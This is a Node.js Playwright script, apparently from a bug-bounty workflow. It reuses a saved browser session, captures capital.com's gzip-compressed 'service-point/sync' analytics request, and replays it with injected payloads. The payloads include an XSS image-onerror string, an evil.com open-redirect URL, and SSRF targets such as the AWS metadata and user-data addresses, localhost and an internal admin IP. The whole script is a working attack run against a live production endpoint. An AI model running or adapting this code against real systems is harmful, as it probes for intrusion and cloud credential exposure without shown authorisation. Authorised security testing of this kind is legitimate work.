const { chromium } = require('playwright');
const zlib = require('zlib');
(async () => {
  const browser = await chromium.launch({ headless: true });
  const ctx = await browser.newContext({ storageState: 'C:/Users/bryan/.openclaw/workspace/bounty-passive-pipeline/logs/browser-sessions/intigriti-state.json' });
  const page = await ctx.newPage();
  
  let capturedRequest = null;
  ctx.on('request', req => {
    if (req.url().includes('service-point/sync')) {
      capturedRequest = {
        url: req.url(),
        method: req.method(),
        headers: req.headers(),
        postData: req.postData()
      };
    }
  });
  
  await page.goto('https://capital.com', { waitUntil: 'networkidle', timeout: 20000 });
  await page.waitForTimeout(3000);
  
  if (!capturedRequest) {
    console.log('No sync request captured');
    await browser.close();
    return;
  }
  
  // Decode the real payload
  const decoded = zlib.gunzipSync(Buffer.from(capturedRequest.postData, 'base64')).toString('utf8');
  const originalPayload = JSON.parse(decoded);
  console.log('Original event count: ' + originalPayload.length);
  console.log('First event: ' + JSON.stringify(originalPayload[0]));
  
  // Test XSS/SSRF with PROPERLY COMPRESSED payloads
  const xssPayloads = [
    { name: 'XSS in URL param', url: 'https://capital.com/en-gb?q=<img src=x onerror=alert(1)>' },
    { name: 'Open redirect', url: 'https://capital.com/en-gb?q=https://evil.com' },
    { name: 'SSRF -169', url: 'http://169.254.169.254/latest/meta-data/' },
    { name: 'SSRF - localhost', url: 'http://localhost:8080/' },
    { name: 'Internal IP', url: 'http://192.168.1.1/admin' },
    { name: 'SSRF - AWS', url: 'http://169.254.169.254/latest/user-data/' },
  ];
  
  console.log('\n=== Testing with gzip-compressed payloads ===');
  for (const xss of xssPayloads) {
    const modPayload = originalPayload.map(e => ({ ...e, url: xss.url }));
    const jsonStr = JSON.stringify(modPayload);
    const compressed = zlib.gzipSync(Buffer.from(jsonStr)).toString('base64');
    
    try {
      const r = await page.request.post(capturedRequest.url, {
        data: compressed,
        headers: capturedRequest.headers,
        timeout: 8000
      });
      const t = await r.text();
      console.log(r.status() + ' | ' + xss.name + ' | ' + t.slice(0, 100));
    } catch (e) {
      console.log('ERR | ' + xss.name + ' | ' + e.message.slice(0, 60));
    }
  }
  
  await browser.close();
})().catch(e => { console.error(e.message); process.exit(1); });
